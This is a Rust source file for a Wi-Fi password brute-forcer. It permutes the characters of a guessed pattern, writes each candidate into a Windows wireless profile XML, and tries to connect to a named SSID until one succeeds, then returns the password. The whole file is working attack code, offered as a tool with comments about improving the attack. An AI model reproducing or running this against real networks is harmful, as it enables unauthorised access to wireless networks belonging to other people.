extern crate permutohedron;

use self::permutohedron::heap_recursive;
use config::Config;
use file_writer::FileWriter;
use handlers::NetworkXmlProfileHandler;
use network::ProfileNetwork;
use std::io;

const OUTPUT_XML_FILE_PATH: &str = "output.xml";

pub struct WifiBruteforcer<'a> {
  config: Config<'a>,
  output_xml_path: &'a str,
  profile_network: ProfileNetwork,
  xml_handler: Option<NetworkXmlProfileHandler>,
}

/// The Bruteforcer module responsible for performing the attack.
impl<'a> WifiBruteforcer<'a> {
  /// Creates a new instance of the bruteforcer encapsulates in a Result.
  pub fn new(config: Config<'a>) -> Result<Self, io::Error> {
    match ProfileNetwork::new(config.ssid) {
      Ok(network) => Ok(WifiBruteforcer {
        config,
        output_xml_path: OUTPUT_XML_FILE_PATH,
        profile_network: network,
        xml_handler: None,
      }),
      Err(err) => Err(err),
    }
  }

  /// Generates permutatation of vectors of characters passed in, using
  /// a heap recusive strategy.
  fn permutate_characters(&self, data: Vec<char>) -> Vec<String> {
    let mut data = data.to_owned();
    let mut permutations: Vec<String> = Vec::new();

    heap_recursive(&mut data, |p| {
      let w: String = p.to_vec().into_iter().collect();
      permutations.push(w);
    });

    permutations
  }

  /// Generates all possible passwords based on a previously passed in
  /// guessed pattern or the ASCII characters.
  fn generate_all_possible_password(&self) -> Vec<String> {
    let vals: Vec<char> = self.config.pattern_password.chars().collect();
    let possible_combinations = self.permutate_characters(vals);

    possible_combinations
  }

  /// Make an attempt to successsully connect to a previously configured wireless network.
  fn bruteforce_network(&self) -> bool {
    self.profile_network.connect()
  }

  /// Triggers the bruteforcer to try all possible combinations to break the network.
  pub fn perform_attack(&mut self) -> Result<Option<String>, io::Error> {
    if self.xml_handler.is_none() {
      self.xml_handler = Some(NetworkXmlProfileHandler::new()?);
    }

    let original_xml_data = self.xml_handler.as_ref().unwrap().content.clone().unwrap(); // this safe to unwrap because of handling above

    // Generate password combination
    let trial_passwords = self.generate_all_possible_password();

    // This needs GREAT improvement:
    // Better approach: ?
    for password in trial_passwords.iter() {
      // Clone data
      let mut temp_data = String::new();
      original_xml_data.clone_into(&mut temp_data);

      // Replace SSID and password
      let mut temp_data = temp_data.replace("{SSID}", self.config.ssid);
      let temp_data = temp_data.replace("{password}", password);
      FileWriter::write(self.output_xml_path, &temp_data)?;

      // Write details to new xml file
      // THIS NEEDS TO BE MOVED TO A DIFFERENT METHOD (AS THIS ONLY WORKS FOR WINDOWS MACHINE)
      self
        .xml_handler
        .as_mut()
        .unwrap()
        .to_file(self.output_xml_path)?;

      if self.bruteforce_network() {
        return Ok(Some(password.to_string()));
      }
    }

    Ok(None)
  }
}
